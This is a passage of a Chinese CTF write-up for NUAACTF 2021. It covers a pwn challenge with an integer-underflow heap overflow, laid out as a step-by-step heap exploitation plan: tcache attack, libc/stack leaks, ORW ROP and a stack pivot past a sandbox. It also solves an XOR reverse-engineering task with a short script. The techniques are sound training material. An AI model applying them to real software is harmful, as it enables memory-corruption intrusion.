      *(_BYTE *)(a2 - 1LL + a1) = 0;
      for ( i = 0; i < a2 - 1; ++i )  <-----整数溢出---->
      {
        read(0, &buf, 1uLL);
        if ( buf == 10 )
          return __readfsqword(0x28u) ^ v5;
        *(_BYTE *)(a1 + i) = buf;
      }
      ((void (*)(void))((char *)&sub_1318 + 1))();
      return __readfsqword(0x28u) ^ v5;
    }
    

当size=0时，malloc申请0x20大小的chunk，但是输入的时候undigested int a2-1就会是很大的正数导致堆溢出。

###  利用思路

存在沙箱不能回去shell，只能orw读取flag，在此之前需要泄露地址，应先修改fileno=2，标准输出流（stdout）指向stderr实现输出，之后制造chunk
overlap利用unsortedbin泄露libc，用tcache attack泄露heap地址和environ地址（stack
address），然后再堆上布置orw的rop链，由于程序最大能读入0x60大小的内容，所以应多次利用tcache attack
分段申请chunk向heap里写入orw rop，最后将栈迁移到heap完成利用。  
注意：由于沙箱函数在初始化的时候会申请和释放很多chunk，所以早布置对的时候最好把堆填充清理一下。  
 **步骤：**

  1. 申请一些沙箱初始化过程中free的chunk，有助于布置堆
  2. add一个size=0的chunk和一些用于overlap的chunk，edit(0)利用堆溢出实现chunk overlap
  3. free两个0x70的chunk用于修改fileno，再free(1)将chunk放入unsortedbin
  4. 制造unsortedbin和tcache指向同一个地址，申请unsortedbin去修改tcache链指向
  5. edit(0)通过堆溢出实现堆块大小再分配并向chunk2处写入fileno偏移，tcache attack实现stdout->stderr
  6. 在unsortedbin里malloc chunk，leak libc，此时chunk2和unsortedbin的chunk1指向同一个地址
  7. 通过tcache attack leak heapaddress and stackaddress
  8. 向heap写入./flag，将orw rop分段写入heap
  9. 程序返回时将栈迁移到heap的orw处读取flag文件

###  总结

这道题目也是调试了好长时间，理清了其中的利用思路，由于关闭了stdout，脚本在利用的时候会出现乱序或者申请数量不对的情况，需要多运行几次，了解了重定向stdout->stderr的方法，orw和栈迁移。

## Re -> Warm up (xor)

一个很简单的逆向，程序加了反调试，不过静态看也完全够了，ida分析可知只是在 construct 过程中加了另一个异或和反调试。

    
    
    unsigned __int64 sub_84A()
    {
      int i; // [rsp+Ch] [rbp-14h]
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
    
      v2 = __readfsqword(0x28u);
      for ( i = 0; i <= 33; ++i )
        s1[i] ^= 2 * i + 65;
      return __readfsqword(0x28u) ^ v2;
    }
    
    unsigned __int64 sub_8C3()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
    
      v1 = __readfsqword(0x28u);
      if ( ptrace(PTRACE_TRACEME, 0LL, 1LL, 0LL) < 0 )
      {
        while ( 1 )
          ;
      }
      return __readfsqword(0x28u) ^ v1;
    }
    

就是一个亦或,exp如下：

    
    
    s2=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46, 
      0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C, 
      0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43, 
      0x2B, 0x26, 0x89, 0xFE, 0x00]
    s1 = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'
    print(len(s1))
    for i in range(len(s1)+1):
      print(chr(ord(s1[i])^ (2 * i + 65)^s2[i]),end='')
    
    # flag{c0n5truct0r5_functi0n_in_41f}
    

## 源码附件&wp

[NUAACTF源码](https://github.com/Asuri-Team/NUAACTF2021-Challenges)

[附件wp](https://github.com/1094093288/IMG/tree/master/Pwn/2021NUAACTF)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **不梦不醒** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/265144](/post/id/265144)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __2赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIXpbAttHr0FyxcLOF6CXI7ibfB5E3iceDfMfNBYVzNly2QNDHWpia0E7hiag994CZMrvF2oySMej2XCg/132)
不梦不醒

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

